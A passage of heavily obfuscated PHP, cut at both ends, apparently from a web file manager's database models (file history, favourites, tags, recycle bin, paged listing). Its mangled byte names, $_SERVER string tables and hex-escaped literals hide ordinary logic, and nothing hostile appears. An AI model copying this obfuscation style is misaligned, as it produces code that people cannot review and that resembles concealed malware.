$‚’×ÒñĞ =& $_SERVER[ ÇƒŠìÀ]; if (!$êÛø×Í‡) { return !1; } if (!is_array($êÛø×Í‡)) { $êÛø×Í‡ = array($êÛø×Í‡); } $ÆÌö¯ä¹ = array($‚’×ÒñĞ[461] => array($‚’×ÒñĞ[7], $êÛø×Í‡)); $øí×èöØ = $this->field($‚’×ÒñĞ[512])->where($ÆÌö¯ä¹)->select(); if ($øí×èöØ) { $this->where($ÆÌö¯ä¹)->delete(); $½õ¹Ğï = array_to_keyvalue($øí×èöØ, $‚’×ÒñĞ[12], $‚’×ÒñĞ[511]); Model($‚’×ÒñĞ[514])->remove($½õ¹Ğï); } return !0; } public function setDetail($£‰åõãî, $¸¸âˆŞÌ) { $úİÊáÒ§ =& $_SERVER[ ÇƒŠìÀ]; return $this->where(array($úİÊáÒ§[463] => $£‰åõãî))->save(array($úİÊáÒ§[2132] => $¸¸âˆŞÌ)); } public function rollbackToItem($ñƒ·¡‡ã, $°£Îƒ°ğ) { $ÏÆÑ¨î =& $_SERVER[ ÇƒŠìÀ]; $Ü™ş„¤… = Model($ÏÆÑ¨î[854])->sourceInfo($ñƒ·¡‡ã); $this->addHistory($Ü™ş„¤…, LNG($ÏÆÑ¨î[2143])); $É’¦×ŸÁ = $this->find($°£Îƒ°ğ); $êğãÂ = array($ÏÆÑ¨î[511] => $É’¦×ŸÁ[$ÏÆÑ¨î[511]], $ÏÆÑ¨î[78] => $É’¦×ŸÁ[$ÏÆÑ¨î[78]], $ÏÆÑ¨î[87] => time(), $ÏÆÑ¨î[499] => USER_ID); Model($ÏÆÑ¨î[854])->where(array($ÏÆÑ¨î[183] => $ñƒ·¡‡ã))->save($êğãÂ); return $this->where(array($ÏÆÑ¨î[463] => $°£Îƒ°ğ))->delete(); } public function clearSame($ÜŞÕ­Ô©) { $á°¬ŒËõ =& $_SERVER[ ÇƒŠìÀ]; $óÃ¤Å¿´ = $this->listData($ÜŞÕ­Ô©); $Œ—À¨›é = array_to_keyvalue_group($óÃ¤Å¿´, $á°¬ŒËõ[511]); $ˆšÇ€Æé = array(); $Ùã½·ò = array(); foreach ($Œ—À¨›é as $óˆËÌÙÖ) { if (!$óˆËÌÙÖ || count($óˆËÌÙÖ) <= 1) { continue; } foreach ($óˆËÌÙÖ as $è™‹÷š) { $ˆšÇ€Æé[] = $è™‹÷š[$á°¬ŒËõ[511]]; $Ùã½·ò[] = $è™‹÷š[$á°¬ŒËõ[445]]; } } if (!$Ùã½·ò) { return; } $this->where(array($á°¬ŒËõ[445] => array($á°¬ŒËõ[7], $Ùã½·ò)))->delete(); Model($á°¬ŒËõ[514])->remove($ˆšÇ€Æé); } public function userSpace() { $öÉÈÍ¤‘ =& $_SERVER[ ÇƒŠìÀ]; $îÙ¬üë› = $this->tablePrefix; $¾ãˆÃš = array($öÉÈÍ¤‘[1680] => USER_ID); $ë¥Ç²ºß = "{$îÙ¬üë›}\x69\x6f\x5f\x66\x69\154\145\40\146\151\x6c\145\163\x20\157\x6e\x20\146\x69\x6c\x65\x73\56\146\x69\154\x65\111\104\40\75\x20\x68\151\163\x74\x6f\x72\x79\56\x66\x69\154\x65\111\x44"; return $this->alias($öÉÈÍ¤‘[2141])->where($¾ãˆÃš)->join($ë¥Ç²ºß, $öÉÈÍ¤‘[2142])->sum($öÉÈÍ¤‘[78]); } } goto bØâ§ßŠ­™; Aó±ãßÀí: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($òŸ¥‡Ç = false, $Â¥€˜ = '', $û©½éÙè = false) { $ÏÊÛ¿î =& $_SERVER[ ÇƒŠìÀ]; $Ó¯ŠÒ´ä = $this->cacheGet($Â¥€˜); $”Œú“„Œ = $this->optionDefault($Â¥€˜); $”Œú“„Œ = is_array($”Œú“„Œ) ? $”Œú“„Œ : array(); if (is_array($Ó¯ŠÒ´ä)) { $Ó¯ŠÒ´ä = array_merge($”Œú“„Œ, $Ó¯ŠÒ´ä); return $òŸ¥‡Ç ? isset($Ó¯ŠÒ´ä[$òŸ¥‡Ç]) ? $Ó¯ŠÒ´ä[$òŸ¥‡Ç] : null : $Ó¯ŠÒ´ä; } $ë„¦Í®î = $this->filterWhere(array($ÏÊÛ¿î[33] => $Â¥€˜)); $Ó¯ŠÒ´ä = $this->where($ë„¦Í®î)->select(); $Ó¯ŠÒ´ä = array_to_keyvalue($Ó¯ŠÒ´ä, $ÏÊÛ¿î[96], $ÏÊÛ¿î[420]); foreach ($Ó¯ŠÒ´ä as $ÅÒÂªÌÎ => $¨×±ì) { if ($û©½éÙè || in_array($ÅÒÂªÌÎ, $this->jsonField)) { $Ó¯ŠÒ´ä[$ÅÒÂªÌÎ] = json_decode($¨×±ì, !0); } } $this->cacheSet($Â¥€˜, $Ó¯ŠÒ´ä); $Ó¯ŠÒ´ä = array_merge($”Œú“„Œ, $Ó¯ŠÒ´ä); return $òŸ¥‡Ç ? $Ó¯ŠÒ´ä[$òŸ¥‡Ç] : $Ó¯ŠÒ´ä; } public function set($ÒÁä‰½…, $™Øòæé¸ = false, $¾Ö¹‘× = '') { $ÇàÄê”É =& $_SERVER[ ÇƒŠìÀ]; $this->cacheRemove($¾Ö¹‘×); $ŸÌü·ˆ¨ = array(); $ÎÓƒÁğÃ = is_array($ÒÁä‰½…) ? $ÒÁä‰½… : array($ÒÁä‰½… => $™Øòæé¸); foreach ($ÎÓƒÁğÃ as $ùÏ„ôÉ => $Ù§Ó¬¯Ä) { if (is_array($Ù§Ó¬¯Ä)) { $Ù§Ó¬¯Ä = json_encode_force($Ù§Ó¬¯Ä); } $this->checkLength($Ù§Ó¬¯Ä, !1, $this->tableName . $ÇàÄê”É[4] . $ÒÁä‰½…); $Ù§Ó¬¯Ä = self::textEncode($Ù§Ó¬¯Ä); $ÎÓƒÁğÃ = array($ÇàÄê”É[33] => $¾Ö¹‘×, $ÇàÄê”É[96] => $ùÏ„ôÉ, $ÇàÄê”É[420] => $Ù§Ó¬¯Ä); $ŸÌü·ˆ¨[] = $this->filterWhere($ÎÓƒÁğÃ); } if (!$ŸÌü·ˆ¨) { return !0; } $¥î‹µ©» = $this->cacheKey($ÇàÄê”É[446]); CacheLock::lock($¥î‹µ©»); $÷Š€éè° = $this->addAll($ŸÌü·ˆ¨, array(), !0); CacheLock::unlock($¥î‹µ©»); return $÷Š€éè°; } protected function optionDefault($¨¥¶÷÷æ = '') { return !1; } public function setDeep($†Ìˆş¹û, $š¾Ü×ä = false, $Ä¿ñ””ç = '') { $½ËˆÏ = explode($_SERVER[ ÇƒŠìÀ][10], $†Ìˆş¹û); $óâ©ë„• = $this->get(); array_set_value($óâ©ë„•, $†Ìˆş¹û, $š¾Ü×ä); $this->set($½ËˆÏ[0], $óâ©ë„•[$½ËˆÏ[0]], $Ä¿ñ””ç); } public function remove($–¤ÅêĞ, $‚¤šõ¼– = '') { $ª«¨ÁÇ =& $_SERVER[ ÇƒŠìÀ]; $this->cacheRemove($‚¤šõ¼–); $­Øé‰êæ = $this->filterWhere(array($ª«¨ÁÇ[96] => $–¤ÅêĞ, $ª«¨ÁÇ[33] => $‚¤šõ¼–)); if (is_null($–¤ÅêĞ)) { unset($­Øé‰êæ[$ª«¨ÁÇ[96]]); } return $this->where($­Øé‰êæ)->delete(); } public function cacheSet($®¿ëû¡ğ, $Î­¸‘¦å = false) { return Cache::set($this->cacheKey($®¿ëû¡ğ), $Î­¸‘¦å); } public function cacheGet($õô®ˆÔÎ) { return Cache::get($this->cacheKey($õô®ˆÔÎ)); } public function cacheRemove($Ôù‹êª) { return Cache::remove($this->cacheKey($Ôù‹êª)); } protected function filterWhere($ÛıúÜåÏ) { return $ÛıúÜåÏ; } protected function cacheKey($Ï‰ ÎÀ) { return $Ï‰ ÎÀ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\x6d\x65" => "\x69\x6f\137\x73\x6f\x75\x72\143\x65\137\155\x65\164\141", "\x6d\145\164\141\x46\151\145\x6c\x64" => "\163\x6f\x75\162\143\x65\111\104"); protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\124\151\155\145", "\x74\x69\155\x65", "\x69\156\163\x65\162\x74", "\146\165\156\x63\164\x69\157\x6e"), array("\143\x72\145\141\x74\x65\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\156\x73\145\x72\x74", "\x66\165\156\143\164\151\x6f\156"), array("\166\151\145\167\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\163\145\162\164", "\x66\x75\156\143\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¦€Òªˆê) { return $this->listSource(array($_SERVER[ ÇƒŠìÀ][447] => $¦€Òªˆê)); } public function typeName($¿À»ñÍ) { static $Ø¿¸À¼ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\155", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $Ø¿¸À¼[$¿À»ñÍ . $_SERVER[ ÇƒŠìÀ][12]]; } public function sourceListInfo($õİøøÎ, $ƒ•Û²° = false) { $ã´¤›‚ì =& $_SERVER[ ÇƒŠìÀ]; $õİøøÎ = $õİøøÎ ? $õİøøÎ : array(); $õİøøÎ = array_filter(array_unique($õİøøÎ)); if (!$õİøøÎ) { return array(); } $ş¸õ¼Ïƒ = $this->where(array($ã´¤›‚ì[183] => array($ã´¤›‚ì[7], $õİøøÎ)))->select(); $this->_listDataApply($ş¸õ¼Ïƒ, $ƒ•Û²°); return array_to_keyvalue($ş¸õ¼Ïƒ, $ã´¤›‚ì[183]); } public function pathInfoFilter(&$×Ÿñ£›Ò) { $îè³€ú° =& $_SERVER[ ÇƒŠìÀ]; static $·€¤ûäß = false; static $›òÍŠÊ¨ = false; static $¢•¹ÇÕ = false; if (!$·€¤ûäß) { $ÜöäÏøÄ = $îè³€ú°[448]; $ÜöäÏøÄ .= $îè³€ú°[449]; $ÜöäÏøÄ .= $îè³€ú°[450]; $È¡ı‹¨Ç = $îè³€ú°[451]; $Ì¯’°®– = explode($îè³€ú°[50], $È¡ı‹¨Ç); $·€¤ûäß = explode($îè³€ú°[50], $ÜöäÏøÄ); $›òÍŠÊ¨ = array(); foreach ($·€¤ûäß as $¨¼ÚÒèş) { if (in_array($¨¼ÚÒèş, $Ì¯’°®–)) { continue; } $›òÍŠÊ¨[] = $¨¼ÚÒèş; } $¢•¹ÇÕ = explode($îè³€ú°[50], $îè³€ú°[452]); } foreach ($¢•¹ÇÕ as $åêêºÂ”) { if (isset($×Ÿñ£›Ò[$åêêºÂ”])) { $×Ÿñ£›Ò[$åêêºÂ”] = intval($×Ÿñ£›Ò[$åêêºÂ”]); } } $×Ÿñ£›Ò[$îè³€ú°[86]] = $îè³€ú°[453] . $×Ÿñ£›Ò[$îè³€ú°[183]] . $îè³€ú°[454]; $×Ÿñ£›Ò[$îè³€ú°[33]] = $×Ÿñ£›Ò[$îè³€ú°[455]] == 1 ? $îè³€ú°[77] : $îè³€ú°[216]; $×Ÿñ£›Ò[$îè³€ú°[180]] = $this->typeName($×Ÿñ£›Ò[$îè³€ú°[180]]); if ($×Ÿñ£›Ò[$îè³€ú°[455]] != 1) { $×Ÿñ£›Ò[$îè³€ú°[177]] = $×Ÿñ£›Ò[$îè³€ú°[456]]; unset($×Ÿñ£›Ò[$îè³€ú°[456]]); } $Ğı‹°öï = $·€¤ûäß; if (isset($×Ÿñ£›Ò[$îè³€ú°[457]]) && $×Ÿñ£›Ò[$îè³€ú°[457]][$îè³€ú°[458]] == -1) { $Ğı‹°öï = $›òÍŠÊ¨; } $×Ÿñ£›Ò = array_field_key($×Ÿñ£›Ò, $Ğı‹°öï); return $×Ÿñ£›Ò; } public function listUserFav() { $¤“‚¼ïö =& $_SERVER[ ÇƒŠìÀ]; $Ûü÷¥—‡ = Model($¤“‚¼ïö[459])->listData(); $‹ÏóŸ†¶ = array_filter_by_field($Ûü÷¥—‡, $¤“‚¼ïö[33], $¤“‚¼ïö[460]); $‹ÏóŸ†¶ = array_to_keyvalue($‹ÏóŸ†¶, $¤“‚¼ïö[12], $¤“‚¼ïö[86]); if ($‹ÏóŸ†¶) { $ŞÜå´“ = $this->listSource(array($¤“‚¼ïö[461] => array($¤“‚¼ïö[462], $‹ÏóŸ†¶))); } $ŞÜå´“ = array_to_keyvalue($ŞÜå´“[$¤“‚¼ïö[415]], $¤“‚¼ïö[183]); foreach ($Ûü÷¥—‡ as &$¾â†™¬Ñ) { $¾â†™¬Ñ = array($¤“‚¼ïö[463] => $¾â†™¬Ñ[$¤“‚¼ïö[445]], $¤“‚¼ïö[464] => $¾â†™¬Ñ[$¤“‚¼ïö[32]], $¤“‚¼ïö[465] => $¾â†™¬Ñ[$¤“‚¼ïö[86]], $¤“‚¼ïö[466] => $¾â†™¬Ñ[$¤“‚¼ïö[33]], $¤“‚¼ïö[467] => $¾â†™¬Ñ[$¤“‚¼ïö[217]], $¤“‚¼ïö[468] => $¾â†™¬Ñ[$¤“‚¼ïö[87]]); if ($¾â†™¬Ñ[$¤“‚¼ïö[33]] == $¤“‚¼ïö[460] && $ŞÜå´“[$¾â†™¬Ñ[$¤“‚¼ïö[86]]]) { $¾â†™¬Ñ[$¤“‚¼ïö[89]] = $ŞÜå´“[$¾â†™¬Ñ[$¤“‚¼ïö[86]]]; } } unset($¾â†™¬Ñ); return $Ûü÷¥—‡; } public function listUserTag($À†àì‚) { $ÂÓºı™¶ =& $_SERVER[ ÇƒŠìÀ]; if ($À†àì‚ && !is_array($À†àì‚)) { $À†àì‚ = array($À†àì‚); } $½õÎ¸øë = Model($ÂÓºı™¶[469])->listData(); $ÓÃÑ¢ò = array(); $¼‰êèÄ’ = array(); foreach ($½õÎ¸øë as $ç¸ùÀ„Å) { $†ô½èıÁ = $ç¸ùÀ„Å[$ÂÓºı™¶[86]]; if (!$†ô½èıÁ) { continue; } if (!isset($¼‰êèÄ’[$†ô½èıÁ])) { $¼‰êèÄ’[$†ô½èıÁ] = array(); } $¼‰êèÄ’[$†ô½èıÁ][] = $ç¸ùÀ„Å[$ÂÓºı™¶[470]]; $ÓÃÑ¢ò[$ç¸ùÀ„Å[$ÂÓºı™¶[86]]] = $ç¸ùÀ„Å; } $ŒÏÒ­ù = array(); $×•°åÄ = array(); $´À¯Â¬ª = array(); foreach ($¼‰êèÄ’ as $å¬¤Ù‹õ => $ìÎç¯ëı) { $Ç‰¢Ä’Ÿ = !0; if (!$À†àì‚) { $ŒÏÒ­ù[] = $å¬¤Ù‹õ; continue; } foreach ($À†àì‚ as $Ğ¨ÏÌ³) { if (!in_array($Ğ¨ÏÌ³, $ìÎç¯ëı)) { $Ç‰¢Ä’Ÿ = !1; break; } } if (!$Ç‰¢Ä’Ÿ) { continue; } if (!is_numeric($å¬¤Ù‹õ)) { $Ò†çƒÍ = $ÓÃÑ¢ò[$å¬¤Ù‹õ]; $†ŠöÚı = array($ÂÓºı™¶[32] => $Ò†çƒÍ[$ÂÓºı™¶[32]], $ÂÓºı™¶[86] => $Ò†çƒÍ[$ÂÓºı™¶[86]], $ÂÓºı™¶[33] => $Ò†çƒÍ[$ÂÓºı™¶[33]], $ÂÓºı™¶[89] => array($ÂÓºı™¶[471] => 1), $ÂÓºı™¶[218] => !0); if ($Ò†çƒÍ[$ÂÓºı™¶[33]] == $ÂÓºı™¶[216]) { $´À¯Â¬ª[] = $†ŠöÚı; } if ($Ò†çƒÍ[$ÂÓºı™¶[33]] == $ÂÓºı™¶[77]) { $×•°åÄ[] = $†ŠöÚı; } continue; } $ŒÏÒ­ù[] = $å¬¤Ù‹õ; } if ($ŒÏÒ­ù) { $¢ä—à = $this->listSource(array($ÂÓºı™¶[461] => array($ÂÓºı™¶[462], $ŒÏÒ­ù))); } $¢ä—à = $¢ä—à ? $¢ä—à : array($ÂÓºı™¶[84] => array(), $ÂÓºı™¶[85] => array()); $¢ä—à[$ÂÓºı™¶[84]] = array_merge($¢ä—à[$ÂÓºı™¶[84]], $×•°åÄ); $¢ä—à[$ÂÓºı™¶[85]] = array_merge($¢ä—à[$ÂÓºı™¶[85]], $´À¯Â¬ª); if (isset($¢ä—à[$ÂÓºı™¶[412]]) && count($ŒÏÒ­ù) == $¢ä—à[$ÂÓºı™¶[412]][$ÂÓºı™¶[413]]) { return $¢ä—à; } $˜«€¢öõ = array(); $¾·å‚ÖÑ = array_to_keyvalue($¢ä—à[$ÂÓºı™¶[84]], $ÂÓºı™¶[12], $ÂÓºı™¶[183]); $–º¾†çß = array_to_keyvalue($¢ä—à[$ÂÓºı™¶[85]], $ÂÓºı™¶[12], $ÂÓºı™¶[183]); $‘§Ÿ…µ = array_merge($–º¾†çß, $¾·å‚ÖÑ); foreach ($ŒÏÒ­ù as $†ô½èıÁ) { if (!in_array($†ô½èıÁ, $‘§Ÿ…µ)) { $˜«€¢öõ[] = $†ô½èıÁ; } } if ($˜«€¢öõ) { Model($ÂÓºı™¶[472])->removeBySource($˜«€¢öõ); } return $¢ä—à; } public function listUserRecycle() { $ïå™¯ù¾ =& $_SERVER[ ÇƒŠìÀ]; $©Ó’Ó±å = Model($ïå™¯ù¾[473])->listData(); if (!$©Ó’Ó±å) { return array(); } $éëÄ—» = array($ïå™¯ù¾[461] => array($ïå™¯ù¾[462], $©Ó’Ó±å), $ïå™¯ù¾[474] => 1); return $this->listSource($éëÄ—»); } public function listSource($Î¦¾ Õ‰, $¦‚¸úåâ = 3000, $ë·ÚåÄ¶ = false) { $î¸¨ ¶¨ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($Î¦¾ Õ‰[$î¸¨ ¶¨[475]])) { $Î¦¾ Õ‰[$î¸¨ ¶¨[475]] = 0; } if (isset($Î¦¾ Õ‰[$î¸¨ ¶¨[182]]) && $Î¦¾ Õ‰[$î¸¨ ¶¨[182]] == $î¸¨ ¶¨[214]) { $Î¦¾ Õ‰[$î¸¨ ¶¨[456]] = array($î¸¨ ¶¨[377], $î¸¨ ¶¨[476]); } $É±îÒ¿‰ = $î¸¨ ¶¨[477]; $§Ş‡ñò€ = $this->field($É±îÒ¿‰)->_makeOrder()->where($Î¦¾ Õ‰)->selectPage($¦‚¸úåâ); $this->_listPageCheck($§Ş‡ñò€, $É±îÒ¿‰, $Î¦¾ Õ‰); $this->_listDataApply($§Ş‡ñò€[$î¸¨ ¶¨[415]], $ë·ÚåÄ¶); $this->_listMake($§Ş‡ñò€); return $§Ş‡ñò€; } private function _listPageCheck(&$ìğÂ´ƒ›, $Ì«İˆµ˜, $ºê•ºÈé) { $‰Æ˜£®§ =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($ìğÂ´ƒ›[$‰Æ˜£®§[412]])) { return; } $öà„¼Û» = $ìğÂ´ƒ›[$‰Æ˜£®§[412]]; if ($öà„¼Û»[$‰Æ˜£®§[414]] <= 1) { return; } if ($öà„¼Û»[$‰Æ˜£®§[413]] >= 100000) { return; } if (Model($‰Æ˜£®§[478])->get($‰Æ˜£®§[479]) != $‰Æ˜£®§[480]) { return; } $Ì«İˆµ˜ = str_replace(array($‰Æ˜£®§[53], $‰Æ˜£®§[388], $‰Æ˜£®§[248]), $‰Æ˜£®§[12], $Ì«İˆµ˜); $Ì«İˆµ˜ = $‰Æ˜£®§[481] . str_replace($‰Æ˜£®§[50], $‰Æ˜£®§[482], $Ì«İˆµ˜) . $‰Æ˜£®§[483]; $ûÄ…½¶ = $‰Æ˜£®§[484]; $ûÄ…½¶ = $ûÄ…½¶ . $‰Æ˜£®§[485]; $Òİ›‘Šˆ = $öà„¼Û»[$‰Æ˜£®§[409]] * ($öà„¼Û»[$‰Æ˜£®§[399]] - 1) . $‰Æ˜£®§[50] . $öà„¼Û»[$‰Æ˜£®§[409]]; $ÁøëÕ = $this->_makeOrder(!0); $—ƒØôıË = $‰Æ˜£®§[481] . str_replace($‰Æ˜£®§[50], $‰Æ˜£®§[482], $ÁøëÕ[0]); if (strpos($—ƒØôıË, $‰Æ˜£®§[486])) { $—ƒØôıË = str_replace($‰Æ˜£®§[486], $‰Æ˜£®§[487], $—ƒØôıË); } else { $—ƒØôıË .= $‰Æ˜£®§[488] . $ÁøëÕ[1]; } $Á¨ùœßı = array(); foreach ($ºê•ºÈé as $ñèŸÂëÚ => $¬üÎòÖ) { $Á¨ùœßı[$‰Æ˜£®§[481] . $ñèŸÂëÚ] = $¬üÎòÖ; } $this->alias($‰Æ˜£®§[489])->field($Ì«İˆµ˜)->limit($Òİ›‘Šˆ)->order($—ƒØôıË); $îà…Û¼ş = $this->join($ûÄ…½¶)->where($Á¨ùœßı)->select(); if ($îà…Û¼ş) { $ìğÂ´ƒ›[$‰Æ˜£®§[415]] = $îà…Û¼ş; } } protected function _makeOrder($‰úùÎÈ“ = false) { $¼ÇÑí¥ù =& $_SERVER[ ÇƒŠìÀ]; $ó±ú¿Íí = Model($¼ÇÑí¥ù[490])->get($¼ÇÑí¥ù[491]); $Õáü·›³ = Model($¼ÇÑí¥ù[490])->get($¼ÇÑí¥ù[492]); $ê§˜ùÃ¨ = array($¼ÇÑí¥ù[493] => $¼ÇÑí¥ù[494], $¼ÇÑí¥ù[495] => $¼ÇÑí¥ù[496]); $úßˆè«• = array($¼ÇÑí¥ù[32] => $¼ÇÑí¥ù[32], $¼ÇÑí¥ù[78] => $¼ÇÑí¥ù[78], $¼ÇÑí¥ù[177] => $¼ÇÑí¥ù[456], $¼ÇÑí¥ù[497] => $¼ÇÑí¥ù[497], $¼ÇÑí¥ù[498] => $¼ÇÑí¥ù[499], $¼ÇÑí¥ù[217] => $¼ÇÑí¥ù[217], $¼ÇÑí¥ù[87] => $¼ÇÑí¥ù[87]); $›Ú­Åñ„ = Input::get($¼ÇÑí¥ù[500], $¼ÇÑí¥ù[7], $ó±ú¿Íí, array_keys($úßˆè«•)); $›æãÎä = Input::get($¼ÇÑí¥ù[501], $¼ÇÑí¥ù[7], $Õáü·›³, array_keys($ê§˜ùÃ¨)); if (!in_array($›Ú­Åñ„, array_keys($úßˆè«•))) { $›Ú­Åñ„ = $¼ÇÑí¥ù[32]; } if (!in_array($›æãÎä, array_keys($ê§˜ùÃ¨))) { $›Ú­Åñ„ = $¼ÇÑí¥ù[493]; } if ($›Ú­Åñ„ == $¼ÇÑí¥ù[32]) { } $®¸ö­ô = $¼ÇÑí¥ù[502] . $úßˆè«•[$›Ú­Åñ„] . $¼ÇÑí¥ù[53] . $ê§˜ùÃ¨[$›æãÎä]; $®¸ö­ô = rtrim(trim($®¸ö­ô), $¼ÇÑí¥ù[50]); if ($‰úùÎÈ“) { return array($®¸ö­ô, $ê§˜ùÃ¨[$›æãÎä]); } return $this->order($®¸ö­ô); } protected function _listDataApplyItem($İŸ–´ğû, $¦æûòŞÈ = false) { $¿”Á‡Ë÷ = array($İŸ–´ğû); $this->_listDataApply($¿”Á‡Ë÷, $¦æûòŞÈ); return $¿”Á‡Ë÷[0]; } protected function _listDataApply(&$ùÀá´‘ä, $÷îÖñúÙ = false) { $î§‘›º‰ =& $_SERVER[ ÇƒŠìÀ]; if (!$ùÀá´‘ä) { $ùÀá´‘ä = array(); return; } $äß¥·òº = array_to_keyvalue($ùÀá´‘ä, $î§‘›º‰[12], $î§‘›º‰[183]); $äß¥·òº = array_unique($äß¥·òº); $this->_listSourceCache($ùÀá´‘ä); if (!$÷îÖñúÙ) { $this->_listAppendMeta($ùÀá´‘ä, $äß¥·òº); $this->_listAppendFileMeta($ùÀá´‘ä, $äß¥·òº); $this->_listAppendChildren($ùÀá´‘ä, $äß¥·òº); } $this->_listAppendPath($ùÀá´‘ä); $this->_listAppendAuth($ùÀá´‘ä); $this->_listAppendSourceInfo($ùÀá´‘ä, $äß¥·òº); $this->_listAppendUser($ùÀá´‘ä); $this->_listFilterInfo($ùÀá´‘ä, $÷îÖñúÙ); $this->_listAppendAuthSecret($ùÀá´‘ä); } protected function _listSourceCache($Óç÷‚¹) { $Åäé‘¸´ =& $_SERVER[ ÇƒŠìÀ]; foreach ($Óç÷‚¹ as $§üúåŞ­) { self::$cacheSourceInfo[$Åäé‘¸´[503] . $§üúåŞ­[$Åäé‘¸´[183]]] = $§üúåŞ­; } } protected function _listFilterInfo(&$ø½üôçÁ, $»±‡ÇÓ = false) { $«¶•»È  =& $_SERVER[ ÇƒŠìÀ]; foreach ($ø½üôçÁ as &$ºì‰ÍŠ) { $ºì‰ÍŠ = $this->pathInfoFilter($ºì‰ÍŠ); self::$cachePathInfo[$«¶•»È [504] . intval($»±‡ÇÓ) . $«¶•»È [432] . $ºì‰ÍŠ[$«¶•»È [183]]] = $ºì‰ÍŠ; } unset($ºì‰ÍŠ); } protected function _listMake(&$Ÿ±œ±Ôº) { $åŒÀ¢üö =& $_SERVER[ ÇƒŠìÀ]; $Ÿ±œ±Ôº[$åŒÀ¢üö[84]] = array(); $Ÿ±œ±Ôº[$åŒÀ¢üö[85]] = array(); foreach ($Ÿ±œ±Ôº[$åŒÀ¢üö[415]] as $³®¿î—‡) { $ÜÁ ¿ı¢ = $³®¿î—‡[$åŒÀ¢üö[455]] == 1 ? $åŒÀ¢üö[84] : $åŒÀ¢üö[85]; $Ÿ±œ±Ôº[$ÜÁ ¿ı¢][] = $³®¿î—‡; } unset($Ÿ±œ±Ôº[$åŒÀ¢üö[415]]); } protected function _listAppendMeta(&$œéáúŠ­, $ú–¥úã) { $Ù‹ÚâŸÉ =& $_SERVER[ ÇƒŠìÀ]; $à­–ë— = array($Ù‹ÚâŸÉ[461] => array($Ù‹ÚâŸÉ[462], $ú–¥úã)); $Ò•‹ËÜœ = Model($Ù‹ÚâŸÉ[505])->field($Ù‹ÚâŸÉ[506])->where($à­–ë—)->select(); if (!$Ò•‹ËÜœ) { return; } $½»Ú„®È = array($Ù‹ÚâŸÉ[507], $Ù‹ÚâŸÉ[508], $Ù‹ÚâŸÉ[487]); $°˜ÊŞ÷ = array(); foreach ($Ò•‹ËÜœ as $õÈ ¦Äˆ) { if (!isset($°˜ÊŞ÷[$õÈ ¦Äˆ[$Ù‹ÚâŸÉ[183]]])) { $°˜ÊŞ÷[$õÈ ¦Äˆ[$Ù‹ÚâŸÉ[183]]] = array(); } if (in_array($õÈ ¦Äˆ[$Ù‹ÚâŸÉ[96]], $½»Ú„®È)) { continue; } $°˜ÊŞ÷[$õÈ ¦Äˆ[$Ù‹ÚâŸÉ[183]]][$õÈ ¦Äˆ[$Ù‹ÚâŸÉ[96]]] = $õÈ ¦Äˆ[$Ù‹ÚâŸÉ[420]]; } foreach ($œéáúŠ­ as &$‹ÃŸ±Ğİ) { $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[509]] = !1; if (isset($°˜ÊŞ÷[$‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[183]]])) { $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[509]] = $°˜ÊŞ÷[$‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[183]]]; } if ($this->fileIsLock($‹ÃŸ±Ğİ) && $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[457]]) { $®°£ÒÖ‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[457]][$Ù‹ÚâŸÉ[458]] = AuthModel::authDisable($‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[457]][$Ù‹ÚâŸÉ[458]], $®°£ÒÖ‰); $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[457]][$Ù‹ÚâŸÉ[510]][$Ù‹ÚâŸÉ[457]] = $‹ÃŸ±Ğİ[$Ù‹ÚâŸÉ[457]][$Ù‹ÚâŸÉ[458]]; } } unset($‹ÃŸ±Ğİ); } protected function _listAppendFileMeta(&$‡†°ğ†­, $­÷íŒå¹) { $´®Õ¯¥» =& $_SERVER[ ÇƒŠìÀ]; $ÆªËÅ¹¹ = array_to_keyvalue($‡†°ğ†­, $´®Õ¯¥»[12], $´®Õ¯¥»[511]); $ÆªËÅ¹¹ = array_filter(array_unique($ÆªËÅ¹¹)); if (!$ÆªËÅ¹¹) { return; } $áÊı™ = array($´®Õ¯¥»[512] => array($´®Õ¯¥»[462], $ÆªËÅ¹¹)); $èĞıøº± = $´®Õ¯¥»[513]; $­éï—ÎÙ = Model($´®Õ¯¥»[514])->field($èĞıøº±)->where($áÊı™)->select(); $­éï—ÎÙ = array_to_keyvalue($­éï—ÎÙ, $´®Õ¯¥»[511]); $Å±üØ€ = Model($´®Õ¯¥»[515])->field($´®Õ¯¥»[516])->where($áÊı™)->select(); $Å±üØ€ = $Å±üØ€ ? $Å±üØ€ : array(); $Ô­–ÌÇü = array(); foreach ($Å±üØ€ as $ÄİñìçŒ) { if (!isset($Ô­–ÌÇü[$ÄİñìçŒ[$´®Õ¯¥»[511]]])) { $Ô­–ÌÇü[$ÄİñìçŒ[$´®Õ¯¥»[511]]] = array(); } $Ô­–ÌÇü[$ÄİñìçŒ[$´®Õ¯¥»[511]]][$ÄİñìçŒ[$´®Õ¯¥»[96]]] = $ÄİñìçŒ[$´®Õ¯¥»[420]]; } foreach ($‡†°ğ†­ as &$©ë‚ˆ¬) { $Ñ…Ä Ì = $©ë‚ˆ¬[$´®Õ¯¥»[511]]; if (!$Ñ…Ä Ì || !is_array($­éï—ÎÙ[$Ñ…Ä Ì])) { continue; } $¡ù¾ŠÎˆ = $­éï—ÎÙ[$Ñ…Ä Ì]; $¡ù¾ŠÎˆ[$´®Õ¯¥»[78]] = 